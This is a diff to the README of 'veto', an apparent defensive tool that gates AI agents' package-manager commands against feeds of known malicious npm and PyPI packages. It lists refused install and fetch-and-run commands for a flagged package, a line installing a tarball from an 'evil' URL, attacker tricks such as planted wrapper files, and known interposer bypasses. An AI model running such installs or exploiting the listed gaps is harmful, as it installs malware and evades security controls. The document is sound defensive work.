@@ -22,6 +22,16 @@ npm install chai-as-upgraded                                  # bare name
 npm install https://example.com/evil.tgz                      # opaque tarball URL
 veto npm ci  # against a lockfile naming a flagged package # transitive coverage
 
+# The canonical Python install form — caught via the python shim,
+# which fast-paths every non-`-m {pm}` invocation back to real python:
+python -m pip install chai-as-upgraded                        # refused
+python3 -m uv pip install chai-as-upgraded                    # refused
+
+# Fetch-and-run forms (npx-style):
+npm exec chai-as-upgraded                                     # refused
+uv tool install chai-as-upgraded                              # refused
+uv run --with chai-as-upgraded python -c …                    # refused
+
 # Python subprocess.run with absolute path AND stripped env — the case
 # agents do constantly:
 subprocess.run(["/opt/homebrew/bin/npm", "install", "chai-as-upgraded"],
@@ -71,7 +81,7 @@ agent-bash threat surface.
 | # | Layer | Catches | Install |
 |---|---|---|---|
 | 1 | Claude Code PreToolUse hook | Bash tool calls inside a Claude session, before the shell sees them | `veto install-claude-hook` |
-| 2 | PATH shims (`~/.local/bin/{npm,pip,…}`) | bare-name PM invocations in any shell that inherits the user's PATH | `veto install-shims` |
+| 2 | PATH shims (`~/.local/bin/{npm,pip,python,…}`) | bare-name PM invocations in any shell that inherits the user's PATH, including `python -m {pip,uv,pipx,poetry,pdm}` via the python shim | `veto install-shims` |
 | 3 | Native execve interposer (`DYLD_INSERT_LIBRARIES` / `LD_PRELOAD`) | absolute-path invocations and `subprocess.run([abs])` in processes that inherit the preload env var | `veto install-preload --lib ./libveto_interpose.{dylib,so}` |
 | 4 | Real-binary wrappers | absolute-path invocations even when env vars are stripped — the dylib doesn't need to load | `veto install-wrappers` |
 
@@ -107,26 +117,34 @@ runs, none of the failure modes above apply.
 
 ```
 intel/             ← parent: Source interface, MalwareReport, Store
+intel/normalize.go ← PEP 503 + npm name normalization at lookup + ingest
 intel/sources/
   aikido/          ← https://malware-list.aikido.dev (implemented)
   openssf/         ← github.com/ossf/malicious-packages (implemented)
   osv/             ← osv.dev MAL-* advisories (implemented)
   pypa/            ← github.com/pypa/advisory-database (PyPI; implemented)
+  internal/fsutil/ ← shared atomic-write helper (source-internal)
 
 packagemanager/    ← parent: PackageManager interface, Install
 packagemanager/
   npm/ pnpm/ yarn/ bun/       ← jsspec-backed
   pip/ uv/ poetry/ pdm/       ← pyspec-backed
-  exec/                       ← parameterized for npx/bunx/pnpx/uvx/pipx
+  exec/                       ← parameterized for npx/bunx/pnpx/uvx/pipx + npm exec
   jsspec/ pyspec/ argv/       ← shared spec parsers
   jsmanifest/ pymanifest/     ← package.json / pyproject.toml expanders
   jslock/ pylock/             ← lockfile expanders (transitive coverage)
   pyreq/                      ← requirements.txt expander
+  pmlist/                     ← canonical PM-name set (single source of truth
+                                consumed by isShimName, install-shims,
+                                install-wrappers, the hook, AND the C
+                                interposer via a generated pm_names.h)
 
 gate/              ← decision logic (allow / refuse / passthrough / abort)
 internal/hook/     ← Claude Code analyzer (Layer 1)
 internal/interposer/  ← native execve/posix_spawn hooks in C (Layer 3)
-cmd/veto/       ← CLI entrypoint
+  cmd/genpmlist/   ← go-generate tool that emits pm_names.h from pmlist
+  gen/             ← hosts the //go:generate directive + drift consistency test
+cmd/veto/          ← CLI entrypoint
 hooks/             ← per-agent integration docs
 ```
 
@@ -267,6 +285,16 @@ these):
   attacker-planted symlink whose target name merely contains "veto"
   is not accepted as a no-op, so `install-wrappers` will still
   overwrite it with the real veto wrapper.
+- **Layer 4 `.veto-original` provenance**: a planted
+  `<argv0>.veto-original` next to a veto shim is NOT trusted on its
+  own — `findRealBinary` consults `wrappers.json` and refuses to exec
+  a sibling whose parent path isn't a registered wrapper. A same-UID
+  attacker dropping `~/.local/bin/npm.veto-original` cannot convert
+  one tricked install into permanent gate-defeat.
+- **Etag persistence**: each feed source writes the upstream etag
+  ONLY after the body parses successfully. A transient malformed
+  payload doesn't poison the cache — the next refresh re-downloads
+  rather than 304-looping on a broken body.
 
 **Known limitations** (what veto cannot protect against):
 
@@ -275,7 +303,15 @@ these):
   by dyld for `/usr/bin/*` and `/System/...`; the dir is also
   read-only so Layer 4 wrappers can't be installed there. Out of
   veto's reach by design — it's a command-layer scanner, not a
-  kernel-level interposer.
+  kernel-level interposer. Non-SIP python (mise, pyenv, homebrew) IS
+  covered via the Layer 2 python shim — only the system interpreter
+  at `/usr/bin/python3` is unreachable.
+- **Linux `execl*` / `fexecve` / `execveat` coverage**: best-effort.
+  H7 added LD_PRELOAD shadows for execl/execlp/execle/execvpe/
+  fexecve/execveat, but glibc's internal `__execve` calls and
+  statically-linked binaries bypass any libc-level interposer. Layers
+  2 + 4 still catch these on Linux as long as PATH resolution flows
+  through the shim or the real PM has been wrapped.
 - **Toolchain upgrades wiping Layer 4 wrappers**. `brew upgrade node`
   re-installs the real npm binary on top of our symlink. `veto
   doctor` flags this; re-run `veto install-wrappers --force` after
